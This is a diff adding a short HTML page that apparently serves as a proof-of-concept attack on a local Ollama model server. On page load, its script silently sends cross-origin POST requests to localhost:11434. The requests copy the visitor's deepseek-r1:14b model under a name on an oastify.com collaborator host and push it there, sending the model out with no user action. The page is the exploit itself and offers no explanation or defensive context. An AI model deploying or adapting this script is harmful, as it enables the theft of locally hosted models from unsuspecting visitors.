@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto XHR Requests</title>
+    <script>
+        function sendRequests() {
+            // First POST request
+            var xhr1 = new XMLHttpRequest();
+            xhr1.open("POST", "http://localhost:11434/api/push", true);
+            xhr1.setRequestHeader("Content-Type", "text/plain");
+
+              xhr1.send(JSON.stringify({
+                model: "theunvhsdm06ayhgxcd19zphc8iz6zuo.oastify.com/test/deepseek-r1:14b",
+                stream: false
+            }));
+            xhr1.onreadystatechange = function () {
+                if (xhr1.readyState === 4 && xhr1.status === 200) {
+                    console.log("Push Request Successful:", xhr1.responseText);
+                }
+            };
+          
+
+            // Second POST request
+            var xhr2 = new XMLHttpRequest();
+            xhr2.open("POST", "http://localhost:11434/api/copy", true);
+            xhr2.send(JSON.stringify({
+                source: "deepseek-r1:14b",
+                destination: "theunvhsdm06ayhgxcd19zphc8iz6zuo.oastify.com/test/deepseek-r1:14b"
+            }));
+            xhr2.onreadystatechange = function () {
+                if (xhr2.readyState === 4 && xhr2.status === 200) {
+                    console.log("Copy Request Successful:", xhr2.responseText);
+                }
+            };
+   
+        }
+
+        // Run on page load
+        window.onload = sendRequests;
+    </script>
+</head>
+<body>
+    <h1>XHR Requests Running on Page Load</h1>
+</body>
+</html>
